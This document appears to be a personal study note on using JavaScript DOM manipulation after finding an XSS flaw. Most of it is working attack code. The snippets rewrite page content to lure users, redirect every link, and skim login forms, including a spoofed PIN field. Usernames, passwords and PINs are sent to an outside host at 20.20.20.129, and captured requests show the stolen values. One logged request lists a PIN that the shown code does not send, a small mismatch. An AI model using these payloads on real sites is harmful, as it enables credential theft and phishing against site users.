## JS DOM
*With the object model,* JavaScript gets all the power it needs to create dynamic HTML:
1. change all the HTML elements in the page
2. change all the HTML attributes in the page
3. change all the CSS styles in the page
4. remove existing HTML elements and attributes
5. add new HTML elements and attributes
6. react to all existing HTML events in the page
7. create new HTML events in the page


## JS modifiying HTML: if you found an XSS and you would like to change different things on the page as to lure the user to do certain activities
```html
<!DOCTYPE html>
<html>
	<head>
		<title>Test page</title>
	</head>
	<body>
		<div id="mydiv">my text</div>
		<p>par 1</p>
		<p>par 2</p>
		<script>
			document.getElementById("mydiv").innerHTML = "JS modified";
			document.getElementsByTagName("p")[0].innerHTML = "JS changed paragraph one"
			document.getElementsByTagName("p")[1].innerHTML = "JS changed paragraph two"
		</script>
		<button onclick='document.getElementById("mydiv").innerHTML = "Button Clicked";'>Click Me!</button>
	</body>
</html>
```

## executing JS functions on events
```html
<!DOCTYPE html>
<html>
	<script>
		function JSfunc() {
			document.write("you got JS funced!");
		}
	</script>
	<button onclick='JSfunc();'>Click Me!</button>
</html>
```

## JS: modifying links: redirection to malicious links (less suspicious since user triggers the action by clicking the link)
```html
<!DOCTYPE html>
<html>
	<a href="https://www.google.com"> visit google</a>
	<script>
		// first link
		document.getElementsByTagName("a")[0].href = "https://www.youtube.com"
		var links = document.getElementsByTagName("a")
		// looping over all links
		for (i = 0; i < links.length; i++){
			links[i].href = "https://www.youtube.com"
			// for proof
			links[i].innerHTML = "links modified"
		}
	</script>
</html>
```

## JS: hijacking submission input
```html
<!DOCTYPE html>
<html>
  <input name=username id=username>
  <input type=password name=password>
  <button>Login</button>
  <script>
    function hijackThemCreds(){
      var username = document.getElementsByTagName("input")[0].value;
      var password = document.getElementsByTagName("input")[1].value;
      new Image().src="http://20.20.20.129/?u="+username+"&p="+password;
    }
    document.getElementsByTagName("button")[0].onclick = hijackThemCreds;
  </script>
</html>
```
### output
```
GET /?u=victim&p=V1ct1mP@ssw0rd HTTP/1.1
Host: 20.20.20.129
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://nix
Connection: keep-alive
Referer: http://nix/
```

## JS: hijacking submission input II (example using forms) --> making the XMLHTTP request's `async` = false is important to catch the creds before submission. else the submission will take place before the script execution
```html
<form  method="post">
  <div class="container">
    <label for="uname"><b>Username</b></label>
    <input type="text" placeholder="Enter Username" name="uname" required>

    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Enter Password" name="psw" required>

    <button type="submit">Login</button>
    <label>
      <input type="checkbox" checked="checked" name="remember"> Remember me
    </label>
  </div>

  <div class="container" style="background-color:#f1f1f1">
    <button type="button" class="cancelbtn">Cancel</button>
    <span class="psw">Forgot <a href="#">password?</a></span>
  </div>
</form> 
<script>
  function stealCredz() {
    var u = document.forms[0].elements[0].value;
    var p = document.forms[0].elements[1].value;
    const xhttp = new XMLHttpRequest();
    xhttp.open("get","http://20.20.20.129/TakeMyCredz?u="+u+"&p="+p, false);
    xhttp.send();
  }
  document.forms[0].onsubmit = stealCredz;
</script>
</html>
```
### response
```
GET /TakeMyCredz?u=victim&p=V1ct1mP@ssw0rd HTTP/1.1
Host: 20.20.20.129
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://nix
Connection: keep-alive
Referer: http://nix/
```

## JS adding a new form field: Malicious example: adding a PIN code form field to steal the pincode of the user
```html
 <form  method="post">
  <div class="imgcontainer">
    <img src="img_avatar2.png" alt="Avatar" class="avatar">
  </div>

  <div class="container">
    <label for="uname"><b>Username</b></label>
    <input type="text" placeholder="Enter Username" name="uname" required>

    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Enter Password" name="psw" required>

    <!-- spoof
    <label for="pin"><b>Pin Code</b></label>
    <input type="password" placeholder="Enter Pin Code" maxlength="4" name="pin" required>
    spoof -->

    <button type="submit">Login</button>
    <label>
      <input type="checkbox" checked="checked" name="remember"> Remember me
    </label>
  </div>

  <div class="container" style="background-color:#f1f1f1">
    <button type="button" class="cancelbtn">Cancel</button>
    <span class="psw">Forgot <a href="#">password?</a></span>
  </div>
</form> 
<script>
  var input = document.createElement("input");

  input.setAttribute("type","password");
  input.setAttribute("placeholder", "Enter Pin Code");
  input.setAttribute("maxlength", "4");
  input.setAttribute("name", "ping");
  input.setAttribute("required", true);

  var previous = document.getElementsByTagName('button')[0];

  var label = document.createElement("label");

  label.setAttribute("for","pin");

  var bold = document.createElement("b");

  bold.innerHTML = "Pin Code";

  label.appendChild(bold);

  document.getElementsByTagName('div')[1].insertBefore(label, previous);
  document.getElementsByTagName('div')[1].insertBefore(input, previous);

  function stealCredz() {
    var u = document.forms[0].elements[0].value;
    var p = document.forms[0].elements[1].value;
    const xhttp = new XMLHttpRequest();
    xhttp.open("get","http://20.20.20.129/TakeMyCredz?u="+u+"&p="+p, false);
    xhttp.send();
  }
  document.forms[0].onsubmit = stealCredz;

</script>
</html>
```
### response
```
GET /TakeMyCredz?Username=victim&Password=V1ct1mP@ssw0rd&PincCode=4433 HTTP/1.1
Host: 20.20.20.129
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://nix
Connection: keep-alive
Referer: http://nix/
```


## HTML DOM Events List
[W3Schools](https://www.w3schools.com/jsref/dom_obj_event.asp)